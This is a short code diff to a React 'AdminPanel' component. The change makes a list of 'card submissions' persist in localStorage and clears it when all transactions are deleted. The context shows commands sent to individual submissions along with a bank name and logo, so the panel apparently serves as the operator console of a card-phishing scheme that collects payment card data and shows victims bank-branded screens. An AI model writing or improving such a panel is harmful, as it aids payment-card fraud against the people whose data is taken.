@@ -84,6 +84,7 @@ const AdminPanel = () => {
       console.log('[AdminPanel] Deleting all transactions');
       setCardSubmissions([]);
       setAdminCommands({});
+      localStorage.removeItem('card_submissions');
       showNotification('All transactions deleted');
     };
 
@@ -121,6 +122,16 @@ const AdminPanel = () => {
     favicon.href = 'https://static.thenounproject.com/png/74031-200.png';
     document.head.appendChild(favicon);
 
+    // Load submissions from localStorage on mount
+    const saved = localStorage.getItem('card_submissions');
+    if (saved) {
+      try {
+        setCardSubmissions(JSON.parse(saved));
+      } catch (err) {
+        console.error('[AdminPanel] Failed to parse saved submissions', err);
+      }
+    }
+
     // Cleanup function
     return () => {
       console.log('[AdminPanel] Cleaning up and disconnecting.');
@@ -143,6 +154,10 @@ const AdminPanel = () => {
       document.head.removeChild(favicon);
     };
   }, []);
+
+  useEffect(() => {
+    localStorage.setItem('card_submissions', JSON.stringify(cardSubmissions));
+  }, [cardSubmissions]);
 
   const sendCommand = (command: string, submissionId?: string, bankData?: { name: string; logo: string }) => {
     console.log('Admin Panel: Sending command:', command, submissionId, bankData);
